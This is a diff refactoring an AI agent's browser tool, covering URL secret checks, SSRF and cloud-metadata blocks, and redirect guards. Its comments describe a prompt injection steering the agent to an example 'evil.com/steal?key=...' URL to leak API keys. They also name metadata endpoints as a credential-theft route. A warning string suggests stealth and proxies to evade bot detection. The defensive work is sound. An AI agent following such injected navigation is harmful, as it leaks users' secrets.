                 stderr = f.read()
-            returncode = proc.returncode
-
-            # Clean up temp files (best-effort)
-            for p in (stdout_path, stderr_path):
-                try:
-                    os.unlink(p)
-                except OSError:
-                    pass
-
-            # Log stderr for diagnostics — use warning level on failure so it's visible
-            if stderr and stderr.strip():
-                level = logging.WARNING if returncode != 0 else logging.DEBUG
-                logger.log(level, "browser '%s' stderr: %s", command, stderr.strip()[:500])
-
-            stdout_text = stdout.strip()
-
-            # Empty output with rc=0 is a broken state — treat as failure rather
-            # than silently returning {"success": True, "data": {}}.
-            # Some commands (close, record) legitimately return no output.
-            if not stdout_text and returncode == 0 and command not in _EMPTY_OK_COMMANDS:
-                logger.warning("browser '%s' returned empty output (rc=0)", command)
-                result = {"success": False, "error": f"Browser command '{command}' returned no output"}
-            elif stdout_text:
-                try:
-                    parsed = json.loads(stdout_text)
-                    # Warn if snapshot came back empty (common sign of daemon/CDP issues)
-                    if command == "snapshot" and parsed.get("success"):
-                        snap_data = parsed.get("data", {})
-                        if not snap_data.get("snapshot") and not snap_data.get("refs"):
-                            logger.warning("snapshot returned empty content. "
-                                           "Possible stale daemon or CDP connection issue. "
-                                           "returncode=%s", returncode)
-                    result = parsed
-                except json.JSONDecodeError:
-                    raw = stdout_text[:2000]
-                    logger.warning("browser '%s' returned non-JSON output (rc=%s): %s",
-                                   command, returncode, raw[:500])
-
-                    if command == "screenshot":
-                        stderr_text = (stderr or "").strip()
-                        combined_text = "\n".join(
-                            part for part in [stdout_text, stderr_text] if part
-                        )
-                        recovered_path = _extract_screenshot_path_from_text(combined_text)
-
-                        if recovered_path and Path(recovered_path).exists():
-                            logger.info(
-                                "browser 'screenshot' recovered file from non-JSON output: %s",
-                                recovered_path,
-                            )
-                            result = {
-                                "success": True,
-                                "data": {
-                                    "path": recovered_path,
-                                    "raw": raw,
-                                },
-                            }
-                        else:
-                            result = {
-                                "success": False,
-                                "error": f"Non-JSON output from agent-browser for '{command}': {raw}"
-                            }
-                    else:
-                        result = {
-                            "success": False,
-                            "error": f"Non-JSON output from agent-browser for '{command}': {raw}"
-                        }
-            elif returncode != 0:
-                # Check for errors
-                error_msg = stderr.strip() if stderr else f"Command failed with code {returncode}"
-                logger.warning("browser '%s' failed (rc=%s): %s", command, returncode, error_msg[:300])
-                result = {"success": False, "error": error_msg}
-            else:
-                result = {"success": True, "data": {}}
+            _unlink_command_output_files(stdout_path, stderr_path)
+            result = _interpret_browser_command_output(command, stdout, stderr, proc.returncode)
 
     except Exception as e:
         logger.warning("browser '%s' exception: %s", command, e, exc_info=True)
@@ -4114,143 +2981,41 @@ def _run_browser_command(
     return result
 
 
-def _store_full_snapshot(snapshot_text: str) -> Optional[str]:
-    """Write a full page snapshot to cache/web and return its absolute path.
-
-    Called whenever a snapshot exceeds SNAPSHOT_SUMMARIZE_THRESHOLD and the
-    model is about to receive a truncated or LLM-summarized view. Mirrors
-    ``web_tools._store_full_text``: the file lands in the same cache/web
-    directory (mounted read-only into remote backends via
-    credential_files._CACHE_DIRS) so the agent's read_file/terminal tools can
-    page through the complete accessibility tree — including element refs that
-    the truncated view dropped — on any backend.
-
-    The stored copy is secret-redacted (same force-redaction boundary as
-    ``_redact_browser_output``) since page-rendered API keys or tokens must
-    not be written to disk unmasked. The filename is keyed on a content hash,
-    so repeated snapshots of the same page state dedupe to one file. Returns
-    None on failure (storage is best-effort; the truncated view is still
-    returned to the model).
-    """
-    try:
-        import hashlib
-        from hermes_constants import get_hermes_dir
-        from agent.redact import redact_sensitive_text
-
-        content = redact_sensitive_text(snapshot_text, force=True)
-        if len(content) > MAX_STORED_SNAPSHOT_CHARS:
-            content = (
-                content[:MAX_STORED_SNAPSHOT_CHARS]
-                + f"\n\n[... stored copy truncated at {MAX_STORED_SNAPSHOT_CHARS:,} chars "
-                f"of {len(content):,} ...]"
-            )
-        from tools.spill_safety import ensure_spill_dir, write_text_exclusive
-
-        cache_dir = get_hermes_dir("cache/web", "web_cache")
-        ensure_spill_dir(cache_dir, private=False)
-        digest = hashlib.sha256(content.encode("utf-8")).hexdigest()[:10]
-        path = cache_dir / f"browser-snapshot-{digest}.txt"
-        # Deterministic filename in a well-known dir: refuse symlinks via
-        # lstat-unlink + exclusive create. Re-snapshotting the same page
-        # state legitimately overwrites (same content-hash name). Not
-        # private: cache/web is bind-mounted into remote backends whose
-        # container UID must be able to read it.
-        write_text_exclusive(path, content, private=False, overwrite=True)
-        return str(path)
-    except Exception as exc:  # noqa: BLE001
-        logger.debug("Failed to store full browser snapshot: %s", exc)
-        return None
-
-
-def _truncate_snapshot(snapshot_text: str, max_chars: Optional[int] = None) -> str:
-    """Structure-aware truncation for snapshots.
-
-    Cuts at line boundaries so that accessibility tree elements are never
-    split mid-line. The full snapshot is saved to cache/web (same pattern as
-    web_extract's truncate-and-store) and the appended note tells the agent
-    exactly where the complete text lives and how to page through it with
-    read_file — element refs beyond the cut are in the file, not lost.
-
-    Args:
-        snapshot_text: The snapshot text to truncate
-        max_chars: Maximum characters to keep. Defaults to the configured
-            ``browser.snapshot_threshold`` (see
-            :func:`get_browser_snapshot_threshold`).
-
-    Returns:
-        Truncated text with a stored-full-text pointer if truncated
-    """
-    if max_chars is None:
-        max_chars = get_browser_snapshot_threshold()
-    if len(snapshot_text) <= max_chars:
-        return snapshot_text
-
-    stored_path = _store_full_snapshot(snapshot_text)
-
-    lines = snapshot_text.split('\n')
-    result: list[str] = []
-    chars = 0
-    # Reserve space for the truncation note (the stored-path variant is the
-    # longer of the two). Clamp so tiny max_chars values still keep content.
-    reserve = min(110 + len(stored_path or ""), max_chars // 2)
-    for line in lines:
-        if chars + len(line) + 1 > max_chars - reserve:
-            break
-        result.append(line)
-        chars += len(line) + 1
-    remaining = len(lines) - len(result)
-    if remaining > 0:
-        if stored_path:
-            next_line = len(result) + 1
-            result.append(
-                f'\n[... {remaining} more lines truncated — full snapshot: '
-                f'read_file path="{stored_path}" offset={next_line} limit=200]'
-            )
-        else:
-            result.append(f'\n[... {remaining} more lines truncated, use browser_snapshot for full content]')
-    return '\n'.join(result)
-
-
-def _redact_browser_output(value: Any) -> Any:
-    """Redact secrets from browser-originated data before returning to the model.
-
-    Browser snapshots, console messages, JS exceptions, and eval results can
-    contain page-rendered API keys, cookies, bearer tokens, or pasted secrets.
-    Tool output is a model boundary, so force redaction here even if global log
-    redaction is disabled for debugging.
-    """
-    from agent.redact import redact_sensitive_text
-
-    if isinstance(value, str):
-        return redact_sensitive_text(value, force=True)
-    if isinstance(value, list):
-        return [_redact_browser_output(item) for item in value]
-    if isinstance(value, tuple):
-        return tuple(_redact_browser_output(item) for item in value)
-    if isinstance(value, dict):
-        return {key: _redact_browser_output(item) for key, item in value.items()}
-    return value
-
-
 # ============================================================================
 # Browser Tool Functions
 # ============================================================================
 
-def evaluate_url_safety(url: str) -> Optional[dict]:
-    """Run URL safety checks; None if safe, else an error dict"""
+def _secret_url_error(url: str) -> Optional[dict]:
+    """Refuse URLs that embed an API key/token (raw and URL-decoded, catching ``%2D`` tricks).
+
+    A prompt injection could otherwise make the agent navigate to
+    ``https://evil.com/steal?key=sk-ant-...`` to exfiltrate secrets.
+    """
     import urllib.parse
     from agent.redact import _PREFIX_RE
 
-    _secret = {"success": False, "error": "Blocked: URL contains what appears to be an API key or token. Secrets must not be sent in URLs."}
     if _PREFIX_RE.search(url) or _PREFIX_RE.search(urllib.parse.unquote(url)):
-        return _secret
-    url = _normalize_url_for_request(url)
-    if _PREFIX_RE.search(url) or _PREFIX_RE.search(urllib.parse.unquote(url)):
-        return _secret
+        return {"success": False, "error": "Blocked: URL contains what appears to be an API key or token. Secrets must not be sent in URLs."}
+    return None
 
+
+def _url_policy_error(url: str, *, auto_local: bool = False) -> Optional[dict]:
+    """Backend-aware URL checks on an already-normalized URL; None if allowed.
+
+    Order matters and every step is a floor for the next:
+      1. Credential-like query params are refused for cloud backends (third-party
+         readers) — allowed for local backends and for the hybrid local sidecar.
+      2. Cloud metadata / IMDS endpoints are refused UNCONDITIONALLY, for every
+         backend including pure-local Chromium and off-host CDP (a local Chromium
+         on a cloud VM still reaches the host IMDS).
+      3. Private/internal addresses are refused unless the backend is local, the
+         URL is being auto-routed to the local sidecar (``auto_local``), or
+         ``browser.allow_private_urls`` opts out.
+      4. Website policy (config allow/deny lists).
+    """
     local = _is_local_backend()
     sensitive_query_key = _sensitive_query_param_name(url)
-    if sensitive_query_key and not local:
+    if sensitive_query_key and not local and not auto_local:
         return {"success": False, "error": (
             "Blocked: URL contains a credential-like query parameter "
             f"({sensitive_query_key}). Cloud browser backends are third-party "
@@ -4258,7 +3023,7 @@ def evaluate_url_safety(url: str) -> Optional[dict]:
             "query parameter before navigating.")}
     if _is_always_blocked_url(url):
         return {"success": False, "error": "Blocked: URL targets a cloud metadata endpoint"}
-    if not local and not _allow_private_urls() and not _is_safe_url(url):
+    if not local and not auto_local and not _allow_private_urls() and not _is_safe_url(url):
         return {"success": False, "error": "Blocked: URL targets a private or internal address"}
     blocked = check_website_access(url)
     if blocked:
@@ -4267,97 +3032,94 @@ def evaluate_url_safety(url: str) -> Optional[dict]:
     return None
 
 
-def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
-    """
-    Navigate to a URL in the browser.
-
-    Args:
-        url: The URL to navigate to
-        task_id: Task identifier for session isolation
-
-    Returns:
-        JSON string with navigation result (includes stealth features info on first nav)
-    """
-    # Secret exfiltration protection — block URLs that embed API keys or
-    # tokens in query parameters. A prompt injection could trick the agent
-    # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
-    # Also check URL-decoded form to catch %2D encoding tricks (e.g. sk%2Dant%2D...).
-    import urllib.parse
-    from agent.redact import _PREFIX_RE
-    url_decoded = urllib.parse.unquote(url)
-    if _PREFIX_RE.search(url) or _PREFIX_RE.search(url_decoded):
-        return json.dumps({
-            "success": False,
-            "error": "Blocked: URL contains what appears to be an API key or token. "
-                     "Secrets must not be sent in URLs.",
-        })
+def evaluate_url_safety(url: str) -> Optional[dict]:
+    """Run URL safety checks; None if safe, else an error dict"""
+    err = _secret_url_error(url)
+    if err:
+        return err
     url = _normalize_url_for_request(url)
-    normalized_decoded = urllib.parse.unquote(url)
-    if _PREFIX_RE.search(url) or _PREFIX_RE.search(normalized_decoded):
+    return _secret_url_error(url) or _url_policy_error(url)
+
+
+_BOT_DETECTION_TITLE_PATTERNS = (
+    "access denied", "access to this page has been denied",
+    "blocked", "bot detected", "verification required",
+    "please verify", "are you a robot", "captcha",
+    "cloudflare", "ddos protection", "checking your browser",
+    "just a moment", "attention required",
+)
+
+
+def _post_redirect_block(nav_session_key: str, url: str, final_url: str, auto_local_this_nav: bool) -> Optional[str]:
+    """Post-redirect SSRF check; returns a blocked JSON payload or None.
+
+    If the browser followed a redirect to a private/internal address the model
+    could read internal content via later snapshots, so the page is navigated to
+    about:blank first. The cloud-metadata floor fires for every backend (even the
+    local sidecar); the private-address check is skipped for local backends and
+    the hybrid sidecar, and when ``browser.allow_private_urls`` opts out.
+    """
+    if not final_url or final_url == url:
+        return None
+    if _is_always_blocked_url(final_url):
+        _run_browser_command(nav_session_key, "open", ["about:blank"], timeout=10)
         return json.dumps({
             "success": False,
-            "error": "Blocked: URL contains what appears to be an API key or token. "
-                     "Secrets must not be sent in URLs.",
+            "error": "Blocked: redirect landed on a cloud metadata endpoint",
         })
-
-    # SSRF protection — block private/internal addresses before navigating.
-    # Skipped for local backends (Camofox, headless Chromium without a cloud
-    # provider) because the agent already has full local network access via
-    # the terminal tool.  Also skipped when hybrid routing will auto-spawn a
-    # local Chromium sidecar for this URL (cloud provider configured +
-    # private URL + ``browser.auto_local_for_private_urls`` enabled) — the
-    # cloud provider never sees the URL in that case.  Can also be opted
-    # out globally via ``browser.allow_private_urls`` in config.
-    effective_task_id = task_id or "default"
-    nav_session_key = _navigation_session_key(effective_task_id, url)
-    auto_local_this_nav = _is_local_sidecar_key(nav_session_key)
-
-    sensitive_query_key = _sensitive_query_param_name(url)
-    if sensitive_query_key and not _is_local_backend() and not auto_local_this_nav:
-        return json.dumps({
-            "success": False,
-            "error": (
-                "Blocked: URL contains a credential-like query parameter "
-                f"({sensitive_query_key}). Cloud browser backends are third-party "
-                "readers; use a local browser/CDP session or remove the sensitive "
-                "query parameter before navigating."
-            ),
-        })
-
-    # Always-blocked floor: cloud metadata / IMDS endpoints are denied
-    # regardless of backend, hybrid routing, or allow_private_urls.
-    # There's no legitimate agent use case for navigating to
-    # 169.254.169.254 / metadata.google.internal / ECS task metadata
-    # via a browser, and routing those to a local Chromium sidecar
-    # on an EC2/GCP/Azure host exfiltrates IAM credentials (#16234).
-    # The floor is UNCONDITIONAL — it must fire for every backend,
-    # including the pure-local headless Chromium and off-host CDP cases
-    # (a local Chromium on a cloud VM still reaches the host IMDS).
-    if _is_always_blocked_url(url):
-        return json.dumps({
-            "success": False,
-            "error": "Blocked: URL targets a cloud metadata endpoint",
-        })
-
     if (
         not _is_local_backend()
         and not auto_local_this_nav
         and not _allow_private_urls()
-        and not _is_safe_url(url)
+        and not _is_safe_url(final_url)
     ):
+        _run_browser_command(nav_session_key, "open", ["about:blank"], timeout=10)
         return json.dumps({
             "success": False,
-            "error": "Blocked: URL targets a private or internal address",
+            "error": "Blocked: redirect landed on a private/internal address",
         })
+    return None
 
-    # Website policy check — block before navigating
-    blocked = check_website_access(url)
-    if blocked:
-        return json.dumps({
-            "success": False,
-            "error": blocked["message"],
-            "blocked_by_policy": {"host": blocked["host"], "rule": blocked["rule"], "source": blocked["source"]},
-        })
+
+def _attach_auto_snapshot(response: Dict[str, Any], nav_session_key: str) -> None:
+    """Add a compact snapshot to a navigate response so the model can act without browser_snapshot."""
+    try:
+        snap_result = _run_browser_command(nav_session_key, "snapshot", ["-c"])
+        if snap_result.get("success"):
+            snap_data = snap_result.get("data", {})
+            snapshot_text = snap_data.get("snapshot", "")
+            refs = snap_data.get("refs", {})
+            threshold = get_browser_snapshot_threshold()
+            if len(snapshot_text) > threshold:
+                snapshot_text = _truncate_snapshot(snapshot_text, max_chars=threshold)
+            response["snapshot"] = _redact_browser_output(snapshot_text)
+            response["element_count"] = len(refs) if refs else 0
+            if snap_result.get("fallback_warning") and not response.get("fallback_warning"):
+                _copy_fallback_warning(response, snap_result)
+    except Exception as e:
+        logger.debug("Auto-snapshot after navigate failed: %s", e)
+
+
+def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
+    """Navigate to ``url``; returns JSON with title, compact snapshot and, on first nav, stealth features."""
+    # Hybrid routing decides BEFORE the safety checks whether this URL goes to a
+    # local Chromium sidecar (cloud provider configured + private URL +
+    # ``browser.auto_local_for_private_urls``); the cloud provider never sees
+    # the URL in that case, so the private-address checks are relaxed for it.
+    safety_error = _secret_url_error(url)
+    if safety_error is None:
+        url = _normalize_url_for_request(url)
+        safety_error = _secret_url_error(url)
+    if safety_error is not None:
+        return json.dumps(safety_error)
+
+    effective_task_id = task_id or "default"
+    nav_session_key = _navigation_session_key(effective_task_id, url)
+    auto_local_this_nav = _is_local_sidecar_key(nav_session_key)
+
+    safety_error = _url_policy_error(url, auto_local=auto_local_this_nav)
+    if safety_error is not None:
+        return json.dumps(safety_error)
 
     # Camofox backend — delegate after safety checks pass
     if _is_camofox_mode():
@@ -4390,115 +3152,60 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
         timeout=_get_open_command_timeout(first_open=is_first_nav),
     )
 
-    if result.get("success"):
-        data = result.get("data", {})
-        title = data.get("title", "")
-        final_url = data.get("url", url)
-
-        # Post-redirect SSRF check — if the browser followed a redirect to a
-        # private/internal address, block the result so the model can't read
-        # internal content via subsequent browser_snapshot calls.
-        # Skipped for local backends (same rationale as the pre-nav check),
-        # and for the hybrid local sidecar (we're already on a local browser
-        # hitting a private URL by design).
-        # Always-blocked floor (cloud metadata / IMDS) is enforced for every
-        # backend and even when auto_local_this_nav is true — see pre-nav
-        # check for rationale (#16234).
-        if (
-            final_url
-            and final_url != url
-            and _is_always_blocked_url(final_url)
-        ):
-            _run_browser_command(nav_session_key, "open", ["about:blank"], timeout=10)
-            return json.dumps({
-                "success": False,
-                "error": "Blocked: redirect landed on a cloud metadata endpoint",
-            })
-
-        if (
-            not _is_local_backend()
-            and not auto_local_this_nav
-            and not _allow_private_urls()
-            and final_url and final_url != url and not _is_safe_url(final_url)
-        ):
-            # Navigate away to a blank page to prevent snapshot leaks
-            _run_browser_command(nav_session_key, "open", ["about:blank"], timeout=10)
-            return json.dumps({
-                "success": False,
-                "error": "Blocked: redirect landed on a private/internal address",
-            })
-
-        response = {
-            "success": True,
-            "url": final_url,
-            "title": title
-        }
-        # Auditability: stamp navigations that ran on the user's real-profile
-        # copy-browser so usage is visible in the tool result.
-        try:
-            if (session_info.get("features") or {}).get("real_profile"):
-                response["used_real_profile"] = True
-        except Exception:
-            pass
-        # Remember only a successful, non-blocked navigation as the task owner.
-        # Failed opens and blocked redirects must not retarget follow-up clicks
-        # or snapshots to a newly-created but irrelevant session.
-        _last_active_session_key[effective_task_id] = nav_session_key
-        _copy_fallback_warning(response, result)
-
-        # Detect common "blocked" page patterns from title/url
-        blocked_patterns = [
-            "access denied", "access to this page has been denied",
-            "blocked", "bot detected", "verification required",
-            "please verify", "are you a robot", "captcha",
-            "cloudflare", "ddos protection", "checking your browser",
-            "just a moment", "attention required"
-        ]
-        title_lower = title.lower()
-
-        if any(pattern in title_lower for pattern in blocked_patterns):
-            response["bot_detection_warning"] = (
-                f"Page title '{title}' suggests bot detection. The site may have blocked this request. "
-                "Options: 1) Try adding delays between actions, 2) Access different pages first, "
-                "3) Enable advanced stealth (BROWSERBASE_ADVANCED_STEALTH=true, requires Scale plan), "
-                "4) Some sites have very aggressive bot detection that may be unavoidable."
-            )
-
-        # Include feature info on first navigation so model knows what's active
-        if is_first_nav and "features" in session_info:
-            features = session_info["features"]
-            active_features = [k for k, v in features.items() if v]
-            if not features.get("proxies"):
-                response["stealth_warning"] = (
-                    "Running WITHOUT residential proxies. Bot detection may be more aggressive. "
-                    "Consider upgrading Browserbase plan for proxy support."
-                )
-            response["stealth_features"] = active_features
-
-        # Auto-take a compact snapshot so the model can act immediately
-        # without a separate browser_snapshot call.
-        try:
-            snap_result = _run_browser_command(nav_session_key, "snapshot", ["-c"])
-            if snap_result.get("success"):
-                snap_data = snap_result.get("data", {})
-                snapshot_text = snap_data.get("snapshot", "")
-                refs = snap_data.get("refs", {})
-                threshold = get_browser_snapshot_threshold()
-                if len(snapshot_text) > threshold:
-                    snapshot_text = _truncate_snapshot(snapshot_text, max_chars=threshold)
-                response["snapshot"] = _redact_browser_output(snapshot_text)
-                response["element_count"] = len(refs) if refs else 0
-                if snap_result.get("fallback_warning") and not response.get("fallback_warning"):
-                    _copy_fallback_warning(response, snap_result)
-        except Exception as e:
-            logger.debug("Auto-snapshot after navigate failed: %s", e)
-
-        return json.dumps(response, ensure_ascii=False)
-    else:
+    if not result.get("success"):
         return json.dumps({
             "success": False,
             "error": result.get("error", "Navigation failed")
         }, ensure_ascii=False)
+
+    data = result.get("data", {})
+    title = data.get("title", "")
+    final_url = data.get("url", url)
+
+    blocked = _post_redirect_block(nav_session_key, url, final_url, auto_local_this_nav)
+    if blocked is not None:
+        return blocked
+
+    response = {
+        "success": True,
+        "url": final_url,
+        "title": title
+    }
+    # Auditability: stamp navigations that ran on the user's real-profile
+    # copy-browser so usage is visible in the tool result.
+    try:
+        if (session_info.get("features") or {}).get("real_profile"):
+            response["used_real_profile"] = True
+    except Exception:
+        pass
+    # Remember only a successful, non-blocked navigation as the task owner.
+    # Failed opens and blocked redirects must not retarget follow-up clicks
+    # or snapshots to a newly-created but irrelevant session.
+    _last_active_session_key[effective_task_id] = nav_session_key
+    _copy_fallback_warning(response, result)
+
+    title_lower = title.lower()
+    if any(pattern in title_lower for pattern in _BOT_DETECTION_TITLE_PATTERNS):
+        response["bot_detection_warning"] = (
+            f"Page title '{title}' suggests bot detection. The site may have blocked this request. "
+            "Options: 1) Try adding delays between actions, 2) Access different pages first, "
+            "3) Enable advanced stealth (BROWSERBASE_ADVANCED_STEALTH=true, requires Scale plan), "
+            "4) Some sites have very aggressive bot detection that may be unavoidable."
+        )
+
+    # Include feature info on first navigation so model knows what's active
+    if is_first_nav and "features" in session_info:
+        features = session_info["features"]
+        active_features = [k for k, v in features.items() if v]
+        if not features.get("proxies"):
+            response["stealth_warning"] = (
+                "Running WITHOUT residential proxies. Bot detection may be more aggressive. "
+                "Consider upgrading Browserbase plan for proxy support."
+            )
+        response["stealth_features"] = active_features
+
+    _attach_auto_snapshot(response, nav_session_key)
+    return json.dumps(response, ensure_ascii=False)
 
 
 def browser_snapshot(
@@ -4506,17 +3213,10 @@ def browser_snapshot(
     task_id: Optional[str] = None,
     user_task: Optional[str] = None
 ) -> str:
-    """
-    Get a text-based snapshot of the current page's accessibility tree.
+    """Text snapshot of the page's accessibility tree (compact unless ``full``).
 
-    Args:
-        full: If True, return complete snapshot. If False, return compact view.
-        task_id: Task identifier for session isolation
-        user_task: Deprecated — accepted for call-site compatibility, unused.
-            Oversized snapshots always truncate-and-store (no LLM pass).
-
-    Returns:
-        JSON string with page snapshot
+    ``user_task`` is deprecated and unused: oversized snapshots always
+    truncate-and-store (no LLM pass).
     """
     if _is_camofox_mode():
         from tools.browser_camofox import camofox_snapshot
@@ -4537,35 +3237,9 @@ def browser_snapshot(
         refs = data.get("refs", {})
 
         # ── Private-network guard: block snapshots from eval-navigated private pages ──
-        # After any eval (browser_console) that may have changed location.href to a
-        # private/internal address, the snapshot would expose private page content.
-        # Re-check the current URL before returning the snapshot.
-        if (
-            not _is_local_backend()
-            and not _is_local_sidecar_key(effective_task_id)
-            and not _allow_private_urls()
-        ):
-            try:
-                _url_result = _run_browser_command(
-                    effective_task_id, "eval", ["window.location.href"],
-                    timeout=5, _engine_override="auto",
-                )
-                if _url_result.get("success"):
-                    _current_url = (
-                        _url_result.get("data", {}).get("result", "")
-                        .strip().strip('"').strip("'")
-                    )
-                    if _current_url and not _is_safe_url(_current_url):
-                        return json.dumps({
-                            "success": False,
-                            "error": (
-                                "Blocked: page URL targets a private or internal address "
-                                f"({_current_url}). This may have been caused by a "
-                                "JavaScript navigation via browser_console."
-                            ),
-                        }, ensure_ascii=False)
-            except Exception as _url_exc:
-                logger.debug("browser_snapshot: URL safety check failed (%s)", _url_exc)
+        blocked = _blocked_private_page_content(effective_task_id)
+        if blocked is not None:
+            return blocked
 
         # Oversized snapshots truncate at line boundaries; the full
         # accessibility tree is stored to cache/web and the appended note
@@ -4605,17 +3279,22 @@ def browser_snapshot(
         return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
 
 
+def _tool_response(result: Dict[str, Any], ok: Dict[str, Any], default_error: str) -> str:
+    """Standard tool JSON for a ``_run_browser_command`` result.
+
+    Success → ``{"success": True, **ok}``; failure → ``{"success": False,
+    "error": result.error or default_error}``. Lightpanda fallback metadata
+    is copied onto either shape.
+    """
+    if result.get("success"):
+        response = {"success": True, **ok}
+    else:
+        response = {"success": False, "error": result.get("error", default_error)}
+    return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
+
+
 def browser_click(ref: str, task_id: Optional[str] = None) -> str:
-    """
-    Click on an element.
-
-    Args:
-        ref: Element reference (e.g., "@e5")
-        task_id: Task identifier for session isolation
-
-    Returns:
-        JSON string with click result
-    """
+    """Click the element ``ref`` (e.g. "@e5")."""
     if _is_camofox_mode():
         from tools.browser_camofox import camofox_click
         return camofox_click(ref, task_id)
@@ -4625,38 +3304,14 @@ def browser_click(ref: str, task_id: Optional[str] = None) -> str:
     if blocked is not None:
         return blocked
 
-    # Ensure ref starts with @
     if not ref.startswith("@"):
         ref = f"@{ref}"
-
     result = _run_browser_command(effective_task_id, "click", [ref])
-
-    if result.get("success"):
-        response = {
-            "success": True,
-            "clicked": ref
-        }
-        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
-    else:
-        response = {
-            "success": False,
-            "error": result.get("error", f"Failed to click {ref}")
-        }
-        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
+    return _tool_response(result, {"clicked": ref}, f"Failed to click {ref}")
 
 
 def browser_type(ref: str, text: str, task_id: Optional[str] = None) -> str:
-    """
-    Type text into an input field.
-
-    Args:
-        ref: Element reference (e.g., "@e3")
-        text: Text to type
-        task_id: Task identifier for session isolation
-
-    Returns:
-        JSON string with type result
-    """
+    """Type ``text`` into the element ``ref`` (fill: clears, then types)."""
     if _is_camofox_mode():
         from tools.browser_camofox import camofox_type
         return camofox_type(ref, text, task_id)
@@ -4666,11 +3321,9 @@ def browser_type(ref: str, text: str, task_id: Optional[str] = None) -> str:
     if blocked is not None:
         return blocked
 
-    # Ensure ref starts with @
     if not ref.startswith("@"):
         ref = f"@{ref}"
-
-    # Use fill command (clears then types)
+    # fill clears then types
     result = _run_browser_command(effective_task_id, "fill", [ref, text])
 
     from agent.display import (
@@ -4678,52 +3331,28 @@ def browser_type(ref: str, text: str, task_id: Optional[str] = None) -> str:
         redact_tool_args_for_display,
     )
 
+    # Typed text goes through the secret-pattern redactor so API keys / tokens
+    # don't leak into tool progress or chat history (the raw value was already
+    # sent to the browser above); normal text passes through unchanged.
     display_text = (redact_tool_args_for_display("browser_type", {"text": text}) or {})["text"]
-
     if result.get("success"):
-        response = {
-            "success": True,
-            # Run typed text through the secret-pattern redactor so API keys /
-            # tokens don't leak into tool progress or chat history.  Normal
-            # text passes through unchanged.  The raw value was already sent
-            # to the browser command above.
-            "typed": display_text,
-            "element": ref
-        }
-        response = _copy_fallback_warning(response, result)
-        response = redact_browser_typed_text_for_display(response, text)
-        return json.dumps(response, ensure_ascii=False)
+        response = {"success": True, "typed": display_text, "element": ref}
     else:
-        response = {
-            "success": False,
-            "error": result.get("error", f"Failed to type into {ref}")
-        }
-        response = _copy_fallback_warning(response, result)
-        response = redact_browser_typed_text_for_display(response, text)
-        return json.dumps(response, ensure_ascii=False)
+        response = {"success": False, "error": result.get("error", f"Failed to type into {ref}")}
+    response = _copy_fallback_warning(response, result)
+    response = redact_browser_typed_text_for_display(response, text)
+    return json.dumps(response, ensure_ascii=False)
 
 
 def browser_scroll(direction: str, task_id: Optional[str] = None) -> str:
-    """
-    Scroll the page.
-
-    Args:
-        direction: "up" or "down"
-        task_id: Task identifier for session isolation
-
-    Returns:
-        JSON string with scroll result
-    """
-    # Validate direction
+    """Scroll the page ``direction`` ("up"/"down") by about half a viewport."""
     if direction not in {"up", "down"}:
         return json.dumps({
             "success": False,
             "error": f"Invalid direction '{direction}'. Use 'up' or 'down'."
         }, ensure_ascii=False)
 
-    # Single scroll with pixel amount instead of 5x subprocess calls.
-    # agent-browser supports: agent-browser scroll down 500
-    # ~500px is roughly half a viewport of travel.
+    # Single scroll with a pixel amount (~half a viewport) instead of 5x subprocess calls.
     _SCROLL_PIXELS = 500
 
     if _is_camofox_mode():
@@ -4736,32 +3365,12 @@ def browser_scroll(direction: str, task_id: Optional[str] = None) -> str:
         return result
 
     effective_task_id = _last_session_key(task_id or "default")
-
     result = _run_browser_command(effective_task_id, "scroll", [direction, str(_SCROLL_PIXELS)])
-    if not result.get("success"):
-        response = {
-            "success": False,
-            "error": result.get("error", f"Failed to scroll {direction}")
-        }
-        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
-
-    response = {
-        "success": True,
-        "scrolled": direction
-    }
-    return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
+    return _tool_response(result, {"scrolled": direction}, f"Failed to scroll {direction}")
 
 
 def browser_back(task_id: Optional[str] = None) -> str:
-    """
-    Navigate back in browser history.
-
-    Args:
-        task_id: Task identifier for session isolation
-
-    Returns:
-        JSON string with navigation result
-    """
+    """Navigate back in browser history."""
     if _is_camofox_mode():
         from tools.browser_camofox import camofox_back
         return camofox_back(task_id)
@@ -4769,51 +3378,26 @@ def browser_back(task_id: Optional[str] = None) -> str:
     effective_task_id = _last_session_key(task_id or "default")
     result = _run_browser_command(effective_task_id, "back", [])
 
-    if result.get("success"):
-        # Browser history can land on a private/internal/cloud-metadata
-        # address that the browser_navigate preflight never saw (e.g. a
-        # redirect chain from an earlier legitimate navigation touched an
-        # internal host, or client-side history was otherwise manipulated).
-        # Re-check post-navigation, matching every other content-returning
-        # entry point (browser_snapshot/vision/console/eval, and click/type/
-        # press via _blocked_private_page_action) — the floor must fire for
-        # every backend, not just the initial navigate.
-        if _eval_ssrf_guard_active(effective_task_id):
-            _blocked_url = _current_page_private_url(effective_task_id)
-            if _blocked_url:
-                return json.dumps({
-                    "success": False,
-                    "error": (
-                        "Blocked: page URL targets a private or internal address "
-                        f"({_blocked_url}). Browser history navigation (back) "
-                        "landed on this address."
-                    ),
-                }, ensure_ascii=False)
-        data = result.get("data", {})
-        response = {
-            "success": True,
-            "url": data.get("url", "")
-        }
-        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
-    else:
-        response = {
-            "success": False,
-            "error": result.get("error", "Failed to go back")
-        }
-        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
+    if result.get("success") and _eval_ssrf_guard_active(effective_task_id):
+        # History can land on a private/internal/cloud-metadata address the
+        # navigate preflight never saw (earlier redirect chain, manipulated
+        # client-side history). Re-check post-navigation like every other
+        # content-returning entry point — the floor fires for every backend.
+        _blocked_url = _current_page_private_url(effective_task_id)
+        if _blocked_url:
+            return json.dumps({
+                "success": False,
+                "error": (
+                    "Blocked: page URL targets a private or internal address "
+                    f"({_blocked_url}). Browser history navigation (back) "
+                    "landed on this address."
+                ),
+            }, ensure_ascii=False)
+    return _tool_response(result, {"url": result.get("data", {}).get("url", "")}, "Failed to go back")
 
 
